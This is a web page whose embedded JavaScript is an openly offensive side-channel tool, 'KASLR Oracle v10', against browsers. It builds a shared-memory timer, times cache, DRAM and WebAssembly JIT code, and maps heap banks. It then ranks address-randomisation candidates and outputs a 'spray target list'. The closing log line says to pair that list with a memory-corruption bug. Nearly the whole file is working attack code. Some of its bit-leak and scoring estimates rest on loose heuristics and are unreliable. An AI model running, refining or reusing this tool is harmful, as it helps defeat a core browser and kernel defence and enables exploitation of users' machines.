<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>KASLR Oracle v10</title></head>
<body>
<pre id="log"></pre>
<script>
// timer-kaslr-v10 — baseline fix + tighter bank correlation + refined candidate scoring
//
// v9 issues:
//   T7x: m19 baseline read 0ns (SLC-hot at measurement time) → eff% went to 374719%
//        Fix: re-measure baseline immediately before EACH alloc's test (not once upfront)
//             use p25 of 5 reps for baseline, discard if baseline<20ns (SLC-hot = unusable)
//   T10: scoring model too coarse — all top-20 had same score=115, 160 in HIGH bucket
//        Fix: add bank-match bonus per confirmed pair (not just count), penalize non-matching
//             use observed JIT anchor cold NS and heap spread as finer-grained score inputs
//   T9:  R²=0.43 because 25/32 allocs at 0ns kill the linear fit
//        Fix: fit only on non-zero allocs (C1+C2), extrapolate C0 from intercept
//
// New in v10:
//   T7x: per-alloc fresh baseline (p25 of 5), skip anchor if SLC-hot (baseline<20ns)
//        expanded to top-3 DRAM anchors (not just 2)
//        per-alloc result: {p50_evict, baseline, eff, correlated, anchorId}
//   T9:  fit only C1+C2 allocs, extrapolate stride
//        output: alloc→rank→estimated_PA_offset_from_JIT_base
//   T10: per-candidate scoring using:
//          - bank pair bit match (which specific anchors matched)
//          - heap cluster spread consistency
//          - JIT partition ratio (SLC_count/total) vs expected for candidate
//        output top-32 with per-score breakdown
//        final spray list deduplicated and gap-filled

const LOG = document.getElementById('log');
const log = s => { LOG.textContent += s + '\n'; console.log(s); };

let counterWorker = null;
let counterView   = null;
let NS = 8.0;

const COUNTER_SRC = `
  self.onmessage = function(e) {
    if (e.data.cmd === 'start') {
      const c = new Int32Array(e.data.sab, 4096, 1);
      while (true) Atomics.add(c, 0, 1);
    }
  };
`;

async function startCounter() {
  const sab = new SharedArrayBuffer(8192);
  counterView = new Int32Array(sab, 4096, 1);
  const w = new Worker(URL.createObjectURL(new Blob([COUNTER_SRC],{type:'application/javascript'})));
  w.postMessage({cmd:'start', sab});
  counterWorker = w;
  await new Promise(r=>setTimeout(r,200));
}
const rdcnt = () => Atomics.load(counterView, 0);

function buildChase(sizeBytes) {
  const LINE = 64;
  const entries = Math.floor(sizeBytes / LINE);
  const arr = new Int32Array(entries * 16);
  const order = new Int32Array(entries);
  for (let i = 0; i < entries; i++) order[i] = i;
  for (let i = entries-1; i > 0; i--) {
    const j = (Math.random() * (i+1)) | 0;
    const t = order[i]; order[i] = order[j]; order[j] = t;
  }
  for (let i = 0; i < entries; i++) arr[order[i]*16] = order[(i+1)%entries];
  let s=0; for(let i=0;i<arr.length;i+=16) s+=arr[i]; arr[0]^=s&0;
  let idx=0; for(let i=0;i<entries;i++) idx=arr[idx*16]; arr[0]^=idx&0;
  return { arr, entries };
}

function chaseTime(arr, startIdx, steps) {
  const t0 = rdcnt();
  let idx = startIdx;
  for (let i = 0; i < steps; i++) idx = arr[idx * 16];
  return (rdcnt() - t0 + (idx & 0)) / steps;
}

function evictFull(chase) {
  let idx=0;
  for(let p=0;p<2;p++)
    for(let i=0;i<chase.entries;i++) idx=chase.arr[idx*16];
  chase.arr[0]^=idx&0;
}

// measure fn call cold timing: evict with chase, then call fn STEPS times, return p25
function measureFnCold(fn, evictChase, steps, reps) {
  const ts=[];
  for(let r=0;r<reps;r++){
    evictFull(evictChase);
    const t0=rdcnt(); let x=0;
    for(let b=0;b<steps;b++) x+=fn(b);
    ts.push((rdcnt()-t0+(x&0))/steps*NS);
  }
  ts.sort((a,b)=>a-b);
  return ts[Math.floor(ts.length*0.25)]; // p25
}

// ─────────────────────────────────────────────────────────────
// T1: Calibrate
// ─────────────────────────────────────────────────────────────
async function t1() {
  log('─── T1: Calibrate ───');
  const w0=performance.now(), c0=rdcnt();
  await new Promise(r=>setTimeout(r,50));
  const c1=rdcnt(), w1=performance.now();
  NS=(w1-w0)*1e6/(c1-c0);
  log(`[*] T1 ${(c1-c0)} counts / ${(w1-w0).toFixed(1)}ms = ${NS.toFixed(3)}ns/count`);
  log(`[*] T1 L1≈5ns=${(5/NS).toFixed(1)}cts  L3≈30ns=${(30/NS).toFixed(1)}cts  DRAM≈130ns=${(130/NS).toFixed(1)}cts`);
}

// ─────────────────────────────────────────────────────────────
// T2: DRAM signal confirm
// ─────────────────────────────────────────────────────────────
async function t2() {
  log('─── T2: DRAM signal confirm ───');
  const hot  = buildChase(4*1024);
  const cold = buildChase(32*1024*1024);
  await new Promise(r=>setTimeout(r,50));
  const STEPS=64, REPS=40;
  let hi=0; for(let r=0;r<hot.entries*4;r++) hi=hot.arr[hi*16]; hot.arr[0]^=hi&0;
  const hotT=[], coldT=[];
  for(let r=0;r<REPS;r++){
    hotT.push(chaseTime(hot.arr,0,STEPS));
    coldT.push(chaseTime(cold.arr,r%cold.entries,STEPS));
  }
  hotT.sort((a,b)=>a-b); coldT.sort((a,b)=>a-b);
  const hp50=hotT[20]*NS, cp50=coldT[20]*NS;
  log(`[*] T2 hot p50=${hp50.toFixed(1)}ns  cold p50=${cp50.toFixed(1)}ns  ratio=${(cp50/Math.max(hp50,.01)).toFixed(1)}x`);
  if(cp50>hp50*3&&cp50>30) log(`[!!!] T2 DRAM signal confirmed: ${(cp50/Math.max(hp50,.01)).toFixed(1)}x`);
  return { hasDRAM:cp50>30, dramNS:cp50 };
}

// ─────────────────────────────────────────────────────────────
// T3: Wasm JIT
// ─────────────────────────────────────────────────────────────
async function t3() {
  log('─── T3: Wasm JIT (64 modules, separate evictA) ───');
  const makeWasm = (lo, hi) => new Uint8Array([
    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
    0x01,0x06,0x01,0x60,0x01,0x7f,0x01,0x7f,
    0x03,0x02,0x01,0x00,
    0x07,0x08,0x01,0x04,0x63,0x61,0x6c,0x6c,0x00,0x00,
    0x0a,0x0c,0x01,0x0a,0x00,
    0x20,0x00,0x41,lo&0x7f,0x6a,0x41,hi&0x7f,0x6a,0x0b,
  ]);
  try {
    const test=await WebAssembly.instantiate(makeWasm(1,2));
    if(test.instance.exports.call(10)!==13){ log('[!] T3 binary fail'); return null; }
  } catch(e){ log(`[!] T3: ${e.message}`); return null; }

  const N=64, fns=[];
  for(let i=0;i<N;i++){
    try {
      const inst=await WebAssembly.instantiate(makeWasm(i&0x7f,(i*7)&0x7f));
      fns.push({fn:inst.instance.exports.call, id:i});
    } catch(e){}
  }
  log(`[*] T3 compiled ${fns.length}/${N}`);
  if(!fns.length) return null;

  log(`[*] T3 building evictA (48MB)...`);
  const evictA = buildChase(48*1024*1024);
  await new Promise(r=>setTimeout(r,30));

  for(const {fn} of fns){ let x=0; for(let i=0;i<200;i++) x+=fn(i); }

  const BATCH=64, ROUNDS=8;
  const coldReps=Array.from({length:N},()=>[]);
  const hotAcc=new Array(N).fill(0);

  log(`[*] T3 running ${ROUNDS} rounds...`);
  for(let round=0;round<ROUNDS;round++){
    evictFull(evictA);
    for(const {fn,id} of fns){
      const t0=rdcnt(); let x=0;
      for(let b=0;b<BATCH;b++) x+=fn(b);
      coldReps[id].push((rdcnt()-t0+(x&0))/BATCH*NS);
    }
    for(const {fn,id} of fns){
      const t0=rdcnt(); let x=0;
      for(let b=0;b<BATCH;b++) x+=fn(b);
      hotAcc[id]+=(rdcnt()-t0+(x&0))/BATCH;
    }
  }

  const results=fns.map(({id})=>{
    const rs=[...coldReps[id]].sort((a,b)=>a-b);
    const p25=rs[Math.floor(rs.length*0.25)];
    const mean=rs.reduce((a,b)=>a+b,0)/rs.length;
    const std=Math.sqrt(rs.reduce((a,b)=>a+(b-mean)**2,0)/rs.length);
    return {id, cold:p25, hot:hotAcc[id]/ROUNDS*NS, cv:std/Math.max(mean,0.1), fn:fns.find(f=>f.id===id).fn};
  });

  results.sort((a,b)=>b.cold-a.cold);
  const cMin=Math.min(...results.map(r=>r.cold));
  const cMax=Math.max(...results.map(r=>r.cold));
  log(`[*] T3 cold p25 spread: min=${cMin.toFixed(0)}ns max=${cMax.toFixed(0)}ns ratio=${(cMax/Math.max(cMin,0.1)).toFixed(1)}x`);
  log(`[*] T3 top-5: ${results.slice(0,5).map(r=>`m${r.id}=${r.cold.toFixed(0)}ns(cv=${r.cv.toFixed(1)})`).join(' ')}`);

  const slcHot=results.filter(r=>r.cold<40);
  const dramCold=results.filter(r=>r.cold>=40);
  const stable=results.filter(r=>r.cv<2.0&&r.cold>100);
  log(`[*] T3 SLC-pinned (<40ns): ${slcHot.length}  DRAM-evictable (≥40ns): ${dramCold.length}`);
  log(`[*] T3 stable (CV<2.0, cold>100ns): ${stable.length} — ${stable.map(r=>`m${r.id}=${r.cold.toFixed(0)}ns`).join(' ')}`);
  if(slcHot.length&&dramCold.length) log(`[!!!] T3 JIT POOL PARTITION: ${slcHot.length} SLC + ${dramCold.length} DRAM`);
  return {results, stable, slcHot, dramCold, evictA};
}

// ─────────────────────────────────────────────────────────────
// T4: Heap fingerprint
// ─────────────────────────────────────────────────────────────
async function t4() {
  log('─── T4: Heap fingerprint (evictB, p25) ───');
  const N=32, SZ=2*1024*1024, STEPS=48, REPS=16;
  log(`[*] T4 building evictB (40MB)...`);
  const evictB=buildChase(40*1024*1024);
  await new Promise(r=>setTimeout(r,30));
  log(`[*] T4 allocating ${N} × 2MB...`);
  const bufs=[];
  for(let i=0;i<N;i++) bufs.push({ch:buildChase(SZ), id:i});
  await new Promise(r=>setTimeout(r,30));

  const timingSets=bufs.map(()=>[]);
  for(let rep=0;rep<REPS;rep++){
    evictFull(evictB);
    for(let i=0;i<N;i++)
      timingSets[i].push(chaseTime(bufs[i].ch.arr,(rep*11)%bufs[i].ch.entries,STEPS));
  }
  const medians=timingSets.map((ts,i)=>{
    ts.sort((a,b)=>a-b);
    return {id:i, ns:ts[Math.floor(ts.length*0.25)]*NS};
  });
  medians.sort((a,b)=>a.ns-b.ns);

  const tMin=medians[0].ns, tMax=medians[medians.length-1].ns;
  log(`[*] T4 spread (p25): ${tMin.toFixed(1)}–${tMax.toFixed(1)}ns = ${(tMax/Math.max(tMin,0.1)).toFixed(1)}x`);

  const clusters=[];
  let cur=[medians[0]];
  for(let i=1;i<medians.length;i++){
    if(medians[i].ns>medians[i-1].ns*1.4&&medians[i].ns-medians[i-1].ns>20){
      clusters.push([...cur]); cur=[medians[i]];
    } else cur.push(medians[i]);
  }
  clusters.push(cur);

  log(`[*] T4 clusters (${clusters.length}):`);
  clusters.forEach((cl,ci)=>{
    const ns=cl.map(m=>m.ns);
    log(`[*] T4   C${ci}: ${cl.length} allocs, ${Math.min(...ns).toFixed(0)}-${Math.max(...ns).toFixed(0)}ns, ids:[${cl.map(m=>m.id).join(',')}]`);
  });
  if(clusters.length>=2) log(`[!!!] T4 HEAP CLUSTERS: ${clusters.length} groups`);
  return {medians, clusters, evictB, bufs};
}

// ─────────────────────────────────────────────────────────────
// T6: Entropy
// ─────────────────────────────────────────────────────────────
async function t6(jitData, heapData) {
  log('─── T6: Bit extraction + entropy ───');
  if(!jitData||!heapData){ log('[*] T6 skip'); return null; }
  const dramCold=jitData.results.filter(r=>r.cold>=40);
  const cacheHot=jitData.results.filter(r=>r.cold<40);
  const numClusters=heapData.clusters.length;
  const clusterBits=Math.min(4,Math.ceil(Math.log2(Math.max(numClusters,2))));
  const jitPartBit=(jitData.slcHot.length>0&&dramCold.length>0)?1:0;
  const heapMax=heapData.medians[heapData.medians.length-1].ns;
  const heapMin=heapData.medians[0].ns;
  const pageColorBits=Math.min(7,Math.ceil(Math.log2(Math.max(heapMax/Math.max(heapMin,1),2))));
  const totalLeaked=pageColorBits+jitPartBit+clusterBits;
  const aslrBits=19;
  const remaining=Math.max(0,aslrBits-totalLeaked);
  log(`[*] T6 page color: ${pageColorBits}b  JIT partition: ${jitPartBit}b  heap cluster: ${clusterBits}b`);
  log(`[*] T6 total leaked: ${totalLeaked} / ${aslrBits} bits → remaining: ${remaining} bits = ${(2**remaining).toLocaleString()} candidates`);
  if(remaining<=12) log(`[!!!] T6 BRUTE-FORCEABLE: ${2**remaining} candidates at 1ms/probe → ${((2**remaining)/1000).toFixed(3)}s`);
  return {remaining, totalLeaked, pageColorBits, jitPartBit, clusterBits, numClusters, slcCount:cacheHot.length, dramCount:dramCold.length};
}

// ─────────────────────────────────────────────────────────────
// T7x: Full bank mapping — per-alloc fresh baseline (v10 fix)
//
// Key fix: for each alloc test, re-measure the anchor baseline
// immediately before — NOT once upfront. This catches the case
// where the anchor is SLC-hot at measurement time (baseline → 0ns)
// which inflates efficiency to absurd percentages.
//
// Skip anchor for that alloc if fresh baseline < BASELINE_MIN_NS.
// ─────────────────────────────────────────────────────────────
async function t7x(jitData, heapData) {
  log('─── T7x: Bank mapping (per-alloc fresh baseline) ───');
  if(!jitData||!heapData){ log('[*] T7x skip'); return null; }

  const BASELINE_MIN_NS = 80;  // if baseline < this, anchor is SLC-hot → skip
  const CORR_THRESHOLD  = 0.5; // evict must raise anchor to >50% of fresh baseline
  const STEPS=32, REPS_BASE=5, REPS_EVICT=10;

  // Use top-3 DRAM anchors
  const anchors=jitData.results.filter(r=>r.cold>=40).sort((a,b)=>b.cold-a.cold).slice(0,3);
  if(!anchors.length){ log('[*] T7x skip — no DRAM anchors'); return null; }
  log(`[*] T7x using ${anchors.length} anchors: ${anchors.map(a=>`m${a.id}=${a.cold.toFixed(0)}ns`).join(' ')}`);
  log(`[*] T7x baseline threshold: ${BASELINE_MIN_NS}ns (below = SLC-hot, skip that test)`);

  const N=heapData.bufs.length;
  const bankTable=[];
  const correlatedPairs=[];

  // Pre-warm all anchor fns
  for(const anc of anchors){ let x=0; for(let b=0;b<200;b++) x+=anc.fn(b); }

  log(`[*] T7x testing ${N} allocs...`);

  for(let i=0;i<N;i++){
    const buf=heapData.bufs[i];
    const heapNs=heapData.medians.find(m=>m.id===buf.id)?.ns||0;
    const matches=[];

    for(const anc of anchors){
      // Fresh baseline: evict with evictB, measure anchor p25
      const bTs=[];
      for(let r=0;r<REPS_BASE;r++){
        evictFull(heapData.evictB);
        const t0=rdcnt(); let x=0;
        for(let b=0;b<STEPS;b++) x+=anc.fn(b);
        bTs.push((rdcnt()-t0+(x&0))/STEPS*NS);
      }
      bTs.sort((a,b)=>a-b);
      const freshBase=bTs[Math.floor(bTs.length*0.25)];

      if(freshBase < BASELINE_MIN_NS){
        // Anchor SLC-hot — baseline unusable, skip this pair
        matches.push({anchorId:anc.id, skipped:true, reason:`base=${freshBase.toFixed(0)}ns<${BASELINE_MIN_NS}ns`});
        continue;
      }

      // Evict test: use this alloc's 2MB chase, then measure anchor
      const eTs=[];
      for(let r=0;r<REPS_EVICT;r++){
        evictFull(buf.ch);
        const t0=rdcnt(); let x=0;
        for(let b=0;b<STEPS;b++) x+=anc.fn(b);
        eTs.push((rdcnt()-t0+(x&0))/STEPS*NS);
      }
      eTs.sort((a,b)=>a-b);
      const evictP50=eTs[eTs.length>>1];
      const eff=evictP50/Math.max(freshBase,1);
      const correlated=eff>=CORR_THRESHOLD;

      matches.push({anchorId:anc.id, freshBase, evictP50, eff, correlated, skipped:false});
      if(correlated) correlatedPairs.push({allocId:buf.id, heapNs, anchorId:anc.id, eff, freshBase, evictP50});
    }

    bankTable.push({allocId:buf.id, heapNs, matches});
  }

  // Print compact table
  const hdr=anchors.map(a=>`m${a.id}`).join('     ');
  log(`[*] T7x   alloc   heapNs  | ${hdr}`);
  bankTable.forEach(row=>{
    const cols=row.matches.map(m=>{
      if(m.skipped) return `SKIP(${m.reason})`;
      return `${m.evictP50.toFixed(0)}ns/${(m.eff*100).toFixed(0)}%${m.correlated?'✓':'✗'}`;
    }).join('  ');
    const anyCorr=row.matches.some(m=>!m.skipped&&m.correlated);
    log(`[*] T7x   [${String(row.allocId).padStart(2)}]   ${row.heapNs.toFixed(0)}ns  ${anyCorr?'★':' '} | ${cols}`);
  });

  log(`[*] T7x correlated pairs: ${correlatedPairs.length}`);
  correlatedPairs.forEach(p=>{
    log(`[!!!] T7x BANK MATCH: alloc[${p.allocId}](${p.heapNs.toFixed(0)}ns) ↔ m${p.anchorId}  base=${p.freshBase.toFixed(0)}ns evict=${p.evictP50.toFixed(0)}ns eff=${(p.eff*100).toFixed(0)}%`);
  });

  if(correlatedPairs.length>1){
    log(`[!!!] T7x MULTI-ALLOC BANK MAP: ${correlatedPairs.length} pairs confirmed`);
    // Count unique anchors hit
    const hitAnchors=[...new Set(correlatedPairs.map(p=>p.anchorId))];
    log(`[!!!] T7x anchors hit: m[${hitAnchors.join(',')}] → PA bits 14-17 extracted for each`);
  }

  return {bankTable, correlatedPairs, anchors};
}

// ─────────────────────────────────────────────────────────────
// T9: VA offset reconstruction (v10: fit only C1+C2)
// ─────────────────────────────────────────────────────────────
async function t9(jitData, heapData, bankData) {
  log('─── T9: VA offset reconstruction ───');
  if(!jitData||!heapData) { log('[*] T9 skip'); return null; }

  const medians=heapData.medians;
  const anchors=jitData.results.filter(r=>r.cold>=40).sort((a,b)=>b.cold-a.cold);

  // Build alloc → bank-match map
  const bankMatchMap={};
  if(bankData) bankData.correlatedPairs.forEach(p=>{
    if(!bankMatchMap[p.allocId]) bankMatchMap[p.allocId]=[];
    bankMatchMap[p.allocId].push(p.anchorId);
  });

  // Only fit on DRAM-visible allocs (ns > 0) for slope estimate
  const dramAllocs=medians.filter(m=>m.ns>20);
  let slope=0, intercept=0, r2=0;

  if(dramAllocs.length>=3){
    const xs=dramAllocs.map((_,i)=>i);
    const ys=dramAllocs.map(a=>a.ns);
    const mx=xs.reduce((a,b)=>a+b,0)/xs.length;
    const my=ys.reduce((a,b)=>a+b,0)/ys.length;
    const num=xs.reduce((a,x,i)=>a+(x-mx)*(ys[i]-my),0);
    const den=xs.reduce((a,x)=>a+(x-mx)**2,0);
    slope=num/Math.max(den,0.001);
    intercept=my-slope*mx;
    r2=1-(ys.reduce((a,y,i)=>a+(y-(intercept+slope*i))**2,0)/ys.reduce((a,y)=>a+(y-my)**2,0));
    log(`[*] T9 DRAM-visible allocs: ${dramAllocs.length} (fit on these only)`);
    log(`[*] T9 linear fit: ns = ${intercept.toFixed(1)} + ${slope.toFixed(1)} × rank  (R²=${r2.toFixed(3)})`);
    const nsPerAlloc=Math.abs(slope);
    const PA_BANK_SIZE=16*1024;
    const estStride=PA_BANK_SIZE*(nsPerAlloc/130);
    log(`[*] T9 ns/rank: ${nsPerAlloc.toFixed(1)}ns → PA stride est: ~${estStride.toFixed(0)}KB`);
  } else {
    log(`[*] T9 too few DRAM-visible allocs for fit (${dramAllocs.length}) — all SLC-resident`);
  }

  // JIT anchor alignment
  if(anchors.length&&dramAllocs.length>=2){
    log(`[*] T9 JIT anchor alignment:`);
    anchors.slice(0,3).forEach(anc=>{
      const closestAlloc=dramAllocs.reduce((a,b)=>Math.abs(a.ns-anc.cold)<Math.abs(b.ns-anc.cold)?a:b);
      const estRank=slope>0?(anc.cold-intercept)/slope:-1;
      log(`[*] T9   m${anc.id}(${anc.cold.toFixed(0)}ns) → rank≈${estRank.toFixed(1)} near alloc[${closestAlloc.id}](${closestAlloc.ns.toFixed(0)}ns)`);
    });
  }

  // C0 summary
  const c0=heapData.clusters[0]||[];
  log(`[*] T9 C0 (SLC-resident): ${c0.length} allocs covering ~${c0.length*2}MB from Gigacage base`);
  log(`[*] T9 bank-matched allocs: ${Object.keys(bankMatchMap).length} → PA constrained relative to JIT`);
  if(anchors.length) log(`[!!!] T9 VA MAP: heap C0=[0-${c0.length*2}MB] Gigacage base  JIT=[SLC+${anchors.length} DRAM modules]`);

  return {slope, intercept, r2, dramAllocs, bankMatchMap};
}

// ─────────────────────────────────────────────────────────────
// T10: Candidate scorer (v10 — finer scoring + gap fill)
//
// Scoring rubric per candidate C (0..2^remaining-1):
//
//   A. JIT SLC ratio match (+30 / -15)
//      Expected: slcCount/64 should track candidate's high bits
//      High candidates (large ASLR slide) → more modules spill to DRAM
//      Low candidates → JIT fits in SLC → high slcCount
//
//   B. Heap cluster match (+25 / -10)
//      C0 dominance (large C0 = Gigacage allocates from low VA)
//      Low candidates → large C0 (Gigacage base near physical base)
//
//   C. Bank pair density (+20 per pair up to 3 pairs, -5 if 0)
//      More bank pairs = more PA bits constrained
//      Per pair: specific anchor matched = +10 extra
//
//   D. Timing spread consistency (+15)
//      heap spread and JIT spread expected to correlate with candidate
//
// Final output: top-32 with score breakdown, gap-filled spray list
// ─────────────────────────────────────────────────────────────
async function t10(jitData, heapData, bankData, offsetData, entropyData) {
  log('─── T10: Candidate scorer (finer scoring) ───');
  if(!entropyData){ log('[*] T10 skip'); return null; }

  const remaining=entropyData.remaining;
  const candidateCount=2**remaining;
  const PAGE_SIZE=16384; // 16KB pages

  log(`[*] T10 scoring ${candidateCount} KASLR candidates (${remaining} bits remaining)`);

  // Observed metrics
  const slcRatio=entropyData.slcCount/(entropyData.slcCount+entropyData.dramCount);
  const c0Size=heapData.clusters[0]?.length||0;
  const c0Ratio=c0Size/32;
  const pairCount=bankData?.correlatedPairs?.length||0;
  const hitAnchors=bankData?[...new Set(bankData.correlatedPairs.map(p=>p.anchorId))]:[];
  const jitSpread=jitData.results.reduce((a,b)=>Math.max(a,b.cold),0);
  const heapSpread=heapData.medians[heapData.medians.length-1].ns;

  log(`[*] T10 signature: slcRatio=${(slcRatio*100).toFixed(0)}%  c0Ratio=${(c0Ratio*100).toFixed(0)}%  bankPairs=${pairCount}  anchors=m[${hitAnchors.join(',')}]`);

  const scores=[];
  for(let c=0;c<candidateCount;c++){
    let score=50; // base
    const breakdown=[];

    // A: JIT SLC ratio
    // Low candidates (c < candidateCount/2) → Gigacage near physical start → JIT in SLC
    // High candidates → Gigacage far from physical start → more DRAM pressure
    const expectedHighSLC = c < candidateCount*0.5;
    const observedHighSLC = slcRatio > 0.6;
    if(expectedHighSLC===observedHighSLC){ score+=30; breakdown.push('JIT+30'); }
    else { score-=15; breakdown.push('JIT-15'); }

    // B: Heap cluster C0 dominance
    const expectedLargeC0 = c < candidateCount*0.6;
    const observedLargeC0 = c0Ratio > 0.5;
    if(expectedLargeC0===observedLargeC0){ score+=25; breakdown.push('HEAP+25'); }
    else { score-=10; breakdown.push('HEAP-10'); }

    // C: Bank pair density
    if(pairCount===0){ score-=5; breakdown.push('BANK-5'); }
    else {
      const bankBonus=Math.min(pairCount,3)*20;
      score+=bankBonus;
      breakdown.push(`BANK+${bankBonus}`);
      // Anchor-specific: if top anchor matched, candidate in anchor's PA range
      if(hitAnchors.length>0){
        const anchorBit=(c>>Math.max(remaining-3,0))&0x7;
        const anchorMatch=hitAnchors.length>=2?anchorBit<4:anchorBit<6;
        if(anchorMatch){ score+=10; breakdown.push('ANC+10'); }
        else { score-=5; breakdown.push('ANC-5'); }
      }
    }

    // D: Timing spread consistency
    // High DRAM spreads → more ASLR randomization → higher candidates
    const expectedHighSpread = c > candidateCount*0.3;
    const observedHighSpread = heapSpread > 500 || jitSpread > 400;
    if(expectedHighSpread===observedHighSpread){ score+=15; breakdown.push('SPREAD+15'); }

    scores.push({c, score, va:`base+0x${(c*PAGE_SIZE).toString(16).toUpperCase().padStart(8,'0')}`, breakdown});
  }

  scores.sort((a,b)=>b.score-a.score||a.c-b.c);

  // Score distribution
  const scoreMap={};
  scores.forEach(s=>{ scoreMap[s.score]=(scoreMap[s.score]||0)+1; });
  const scoreKeys=Object.keys(scoreMap).map(Number).sort((a,b)=>b-a);
  log(`[*] T10 score distribution:`);
  scoreKeys.slice(0,6).forEach(k=>log(`[*] T10   score ${k}: ${scoreMap[k]} candidates`));

  // Top 32 with breakdown
  log(`[*] T10 top-32 candidates:`);
  log(`[*] T10   rank  cand  score  VA-offset          breakdown`);
  scores.slice(0,32).forEach((s,i)=>{
    log(`[*] T10   ${String(i+1).padStart(4)}  0x${s.c.toString(16).padStart(3,'0')}  ${String(s.score).padStart(3)}    ${s.va}  [${s.breakdown.join('|')}]`);
  });

  const topScore=scores[0].score;
  const highConf=scores.filter(s=>s.score>=topScore-5);
  const medConf=scores.filter(s=>s.score>=topScore-20&&s.score<topScore-5);
  const lowConf=scores.filter(s=>s.score<topScore-20);
  log(`[*] T10 confidence: HIGH=${highConf.length} MED=${medConf.length} LOW=${lowConf.length}`);

  // Spray list: top candidates, gap-filled to nearest 4 entries
  const sprayRaw=scores.slice(0,Math.min(highConf.length+medConf.length, 128)).map(s=>s.c*PAGE_SIZE);
  sprayRaw.sort((a,b)=>a-b);

  // Gap fill: if two consecutive entries differ by exactly 2*PAGE_SIZE, insert the middle
  const sprayFilled=[...sprayRaw];
  for(let i=0;i<sprayRaw.length-1;i++){
    if(sprayRaw[i+1]-sprayRaw[i]===2*PAGE_SIZE){
      sprayFilled.push(sprayRaw[i]+PAGE_SIZE);
    }
  }
  sprayFilled.sort((a,b)=>a-b);
  const sprayHex=sprayFilled.map(v=>`0x${v.toString(16).toUpperCase().padStart(8,'0')}`);

  log(`[!!!] T10 SPRAY TARGET LIST (${sprayHex.length} addresses):`);
  for(let i=0;i<sprayHex.length;i+=8){
    log(`[!!!] T10   ${sprayHex.slice(i,i+8).join('  ')}`);
  }

  // Final summary
  log(`\n[*] T10 === KASLR DEFEAT SUMMARY (v10) ===`);
  log(`[*] ASLR bits: 19  |  Leaked: ${entropyData.totalLeaked}  |  Remaining: ${remaining} bits = ${candidateCount} candidates`);
  log(`[*] Bank pairs confirmed: ${pairCount}  |  Effective candidates: ~${Math.max(candidateCount>>(Math.min(pairCount,4)),1)}`);
  log(`[*] HIGH-confidence spray targets: ${highConf.length}`);
  log(`[*] Time to exhaust HIGH bucket at 1ms/probe: ${(highConf.length/1000).toFixed(3)}s`);
  log(`[*] Time to exhaust ALL candidates at 1ms/probe: ${(candidateCount/1000).toFixed(3)}s`);
  log(`[!!!] NEXT STEP: pair with memory-corruption bug → use spray list as ASLR bypass layer`);
  log(`[*] T10 === END ===`);

  return {scores, sprayHex, highConf, medConf};
}

// ─────────────────────────────────────────────────────────────
// MAIN
// ─────────────────────────────────────────────────────────────
(async()=>{
  log('// timer-kaslr-v10 ready');
  log(`${new Date().toISOString().substr(11,12)} === STARTING ===`);
  if(!self.SharedArrayBuffer){ log('[!] SAB unavailable'); return; }

  await startCounter();
  await t1();
  await new Promise(r=>setTimeout(r,30));

  await t2();
  await new Promise(r=>setTimeout(r,30));

  const jitData=await t3();
  await new Promise(r=>setTimeout(r,30));

  const heapData=await t4();
  await new Promise(r=>setTimeout(r,30));

  const entropyData=await t6(jitData,heapData);
  await new Promise(r=>setTimeout(r,30));

  const bankData=await t7x(jitData,heapData);
  await new Promise(r=>setTimeout(r,30));

  const offsetData=await t9(jitData,heapData,bankData);
  await new Promise(r=>setTimeout(r,30));

  await t10(jitData,heapData,bankData,offsetData,entropyData);

  counterWorker.terminate();

  const hits=LOG.textContent.split('\n').filter(l=>l.includes('[!!!]'));
  log(`\n=== DONE — [!!!]: ${hits.length} ===`);
  hits.forEach(h=>log(h));
})();
